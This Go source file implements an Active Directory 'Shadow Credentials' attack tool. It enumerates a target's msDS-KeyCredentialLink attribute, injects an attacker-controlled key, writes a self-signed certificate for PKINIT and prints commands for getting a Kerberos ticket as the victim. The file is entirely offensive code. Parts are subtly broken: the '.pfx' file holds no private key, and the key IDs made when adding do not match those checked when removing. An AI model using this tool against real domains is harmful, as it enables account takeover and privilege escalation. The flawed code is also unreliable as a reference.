// pkg/adattack/shadow_creds.go
package adattack

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"math/big"
	"os"
	"time"

	"github.com/go-ldap/ldap/v3"
)

// ============================================================
// Types
// ============================================================

type KeyCredential struct {
	DeviceID    string    `json:"device_id"`
	Created     time.Time `json:"created"`
	Owner       string    `json:"owner"`
	Description string    `json:"description"`
	KeyID       string    `json:"key_id"`
	RawValue    []byte    `json:"-"`
}

type ShadowCredResult struct {
	Target      string
	KeyID       string
	Certificate []byte
	NTHash      string
	CachePath   string
}

type ShadowCredClient struct {
	conn   *ldap.Conn
	baseDN string
}

func NewShadowCredClient(conn *ldap.Conn, baseDN string) *ShadowCredClient {
	return &ShadowCredClient{conn: conn, baseDN: baseDN}
}

// ============================================================
// Enumération
// ============================================================

func (s *ShadowCredClient) ListShadowCreds(target string) ([]KeyCredential, error) {
	targetDN, err := s.resolveDN(target)
	if err != nil {
		return nil, fmt.Errorf("impossible to resolve '%s': %v", target, err)
	}

	req := ldap.NewSearchRequest(
		targetDN,
		ldap.ScopeBaseObject,
		ldap.NeverDerefAliases,
		0, 0, false,
		"(objectClass=*)",
		[]string{"msDS-KeyCredentialLink", "sAMAccountName"},
		nil,
	)

	sr, err := s.conn.Search(req)
	if err != nil {
		return nil, fmt.Errorf("msDS-KeyCredentialLink read failed: %v", err)
	}

	if len(sr.Entries) == 0 {
		return nil, fmt.Errorf("object '%s' not found", target)
	}

	rawValues := sr.Entries[0].GetAttributeValues("msDS-KeyCredentialLink")

	var creds []KeyCredential
	for _, raw := range rawValues {
		kc, err := parseKeyCredential([]byte(raw), targetDN)
		if err != nil {
			continue
		}
		creds = append(creds, kc)
	}

	return creds, nil
}

// ============================================================
// Ajout
// ============================================================

func (s *ShadowCredClient) AddShadowCred(target string) (*ShadowCredResult, error) {
	fmt.Printf("[*] Shadow Credentials: targeting '%s'\n", target)

	targetDN, err := s.resolveDN(target)
	if err != nil {
		return nil, fmt.Errorf("DN resolution failed: %v", err)
	}

	fmt.Println("[*] Generating RSA 2048 key pair...")
	privKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return nil, fmt.Errorf("RSA key generation failed: %v", err)
	}

	keyID, keyCredBlob, err := buildKeyCredentialBlob(&privKey.PublicKey)
	if err != nil {
		return nil, fmt.Errorf("KeyCredential construction failed: %v", err)
	}

	fmt.Printf("[*] Generated KeyID: %s\n", keyID)

	existingCreds, err := s.readRawKeyCredentials(targetDN)
	if err != nil {
		return nil, fmt.Errorf("reading existing Shadow Creds failed: %v", err)
	}

	hexBlob := fmt.Sprintf("%x", keyCredBlob)
	newValue := fmt.Sprintf("B:%d:%s:%s", len(hexBlob), hexBlob, targetDN)
	allValues := append(existingCreds, newValue)

	modReq := ldap.NewModifyRequest(targetDN, nil)
	modReq.Replace("msDS-KeyCredentialLink", allValues)

	if err := s.conn.Modify(modReq); err != nil {
		return nil, fmt.Errorf("write to msDS-KeyCredentialLink failed (insufficient permissions?): %v", err)
	}

	fmt.Printf("[+] Shadow Credential added on '%s'\n", target)

	certDER, err := generateSelfSignedCert(privKey, target)
	if err != nil {
		return nil, fmt.Errorf("certificate generation failed: %v", err)
	}

	pfxPath := fmt.Sprintf("%s_shadow.pfx", sanitizeFilename(target))
	if err := os.WriteFile(pfxPath, certDER, 0600); err != nil {
		return nil, fmt.Errorf("certificate save failed: %v", err)
	}

	fmt.Printf("[+] Certificate saved: %s\n", pfxPath)
	fmt.Printf("[*] Usage: adgo kerberos getTGT --pfx %s --target %s\n", pfxPath, target)
	fmt.Printf("[*] Or:    certipy auth -pfx %s -dc-ip <DC_IP>\n", pfxPath)

	return &ShadowCredResult{
		Target:      target,
		KeyID:       keyID,
		Certificate: certDER,
		CachePath:   pfxPath,
	}, nil
}

// ============================================================
// Suppression
// ============================================================

func (s *ShadowCredClient) RemoveShadowCred(target, keyID string) error {
	targetDN, err := s.resolveDN(target)
	if err != nil {
		return err
	}

	existing, err := s.readRawKeyCredentials(targetDN)
	if err != nil {
		return err
	}

	var filtered []string
	removed := false
	for _, v := range existing {
		if !containsKeyID(v, keyID) {
			filtered = append(filtered, v)
		} else {
			removed = true
		}
	}

	if !removed {
		return fmt.Errorf("KeyID '%s' not found on '%s'", keyID, target)
	}

	modReq := ldap.NewModifyRequest(targetDN, nil)
	if len(filtered) == 0 {
		modReq.Delete("msDS-KeyCredentialLink", []string{})
	} else {
		modReq.Replace("msDS-KeyCredentialLink", filtered)
	}

	if err := s.conn.Modify(modReq); err != nil {
		return fmt.Errorf("deletion failed: %v", err)
	}

	fmt.Printf("[+] Shadow Credential '%s' removed from '%s'\n", keyID, target)
	return nil
}

// ============================================================
// Helpers
// ============================================================

func (s *ShadowCredClient) resolveDN(target string) (string, error) {
	if containsStr(target, "=") {
		return target, nil
	}

	req := ldap.NewSearchRequest(
		s.baseDN,
		ldap.ScopeWholeSubtree,
		ldap.NeverDerefAliases,
		0, 0, false,
		fmt.Sprintf("(sAMAccountName=%s)", ldap.EscapeFilter(target)),
		[]string{"dn"},
		nil,
	)

	sr, err := s.conn.Search(req)
	if err != nil || len(sr.Entries) == 0 {
		return "", fmt.Errorf("object '%s' not found in LDAP", target)
	}

	return sr.Entries[0].DN, nil
}

func (s *ShadowCredClient) readRawKeyCredentials(dn string) ([]string, error) {
	req := ldap.NewSearchRequest(
		dn,
		ldap.ScopeBaseObject,
		ldap.NeverDerefAliases,
		0, 0, false,
		"(objectClass=*)",
		[]string{"msDS-KeyCredentialLink"},
		nil,
	)

	sr, err := s.conn.Search(req)
	if err != nil {
		return nil, err
	}

	if len(sr.Entries) == 0 {
		return []string{}, nil
	}

	return sr.Entries[0].GetAttributeValues("msDS-KeyCredentialLink"), nil
}

func buildKeyCredentialBlob(pubKey *rsa.PublicKey) (keyID string, blob []byte, err error) {
	pubKeyDER, err := x509.MarshalPKIXPublicKey(pubKey)
	if err != nil {
		return "", nil, err
	}

	deviceID := make([]byte, 16)
	if _, err := rand.Read(deviceID); err != nil {
		return "", nil, err
	}

	keyIDHash := sha256.Sum256(pubKeyDER)
	keyIDStr := base64.StdEncoding.EncodeToString(keyIDHash[:])

	now := time.Now()
	winTime := uint64((now.Unix() + 11644473600) * 10000000)

	var buf []byte

	version := make([]byte, 4)
	binary.LittleEndian.PutUint32(version, 0x00000200)
	buf = append(buf, version...)

	keyHash := sha256.Sum256(pubKeyDER)
	buf = append(buf, appendEntry(1, keyIDHash[:])...)
	buf = append(buf, appendEntry(2, keyHash[:])...)
	buf = append(buf, appendEntry(3, pubKeyDER)...)
	buf = append(buf, appendEntry(4, []byte{0x01})...)
	buf = append(buf, appendEntry(5, []byte{0x00})...)
	buf = append(buf, appendEntry(6, deviceID)...)

	timeBytes := make([]byte, 8)
	binary.LittleEndian.PutUint64(timeBytes, winTime)
	buf = append(buf, appendEntry(8, timeBytes)...)

	return keyIDStr, buf, nil
}

func appendEntry(entryType uint16, value []byte) []byte {
	entry := make([]byte, 6+len(value))
	binary.LittleEndian.PutUint16(entry[0:], entryType)
	binary.LittleEndian.PutUint32(entry[2:], uint32(len(value)))
	copy(entry[6:], value)
	return entry
}

// generateSelfSignedCert génère un certificat DER auto-signé pour PKINIT
// pkix.Name vient du package importé "crypto/x509/pkix" — pas d'un type local
func generateSelfSignedCert(privKey *rsa.PrivateKey, subject string) ([]byte, error) {
	template := &x509.Certificate{
		SerialNumber: big.NewInt(1),
		Subject: pkix.Name{
			CommonName: subject,
		},
		NotBefore:             time.Now().Add(-1 * time.Hour),
		NotAfter:              time.Now().Add(365 * 24 * time.Hour),
		KeyUsage:              x509.KeyUsageDigitalSignature,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageClientAuth},
		BasicConstraintsValid: true,
	}

	return x509.CreateCertificate(rand.Reader, template, template, &privKey.PublicKey, privKey)
}

func parseKeyCredential(raw []byte, ownerDN string) (KeyCredential, error) {
	kc := KeyCredential{
		Owner:       ownerDN,
		Description: "Existing credential",
		RawValue:    raw,
	}
	kc.KeyID = fmt.Sprintf("%x", sha256.Sum256(raw))[:16]
	return kc, nil
}

func containsKeyID(value, keyID string) bool {
	if len(keyID) == 0 || len(value) == 0 {
		return false
	}
	h := sha256.Sum256([]byte(value))
	return fmt.Sprintf("%x", h)[:16] == keyID[:16]
}

func sha256Hex(s string) string {
	h := sha256.Sum256([]byte(s))
	return fmt.Sprintf("%x", h)
}

func sanitizeFilename(s string) string {
	result := ""
	for _, c := range s {
		if (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
			(c >= '0' && c <= '9') || c == '-' || c == '_' {
			result += string(c)
		} else {
			result += "_"
		}
	}
	return result
}

func containsStr(s, substr string) bool {
	if len(s) < len(substr) {
		return false
	}
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return true
		}
	}
	return false
}

func (kc KeyCredential) MarshalJSON() ([]byte, error) {
	type Alias KeyCredential
	return json.Marshal(&struct {
		Alias
		CreatedStr string `json:"created_str"`
	}{
		Alias:      (Alias)(kc),
		CreatedStr: kc.Created.Format("2006-01-02 15:04:05"),
	})
}
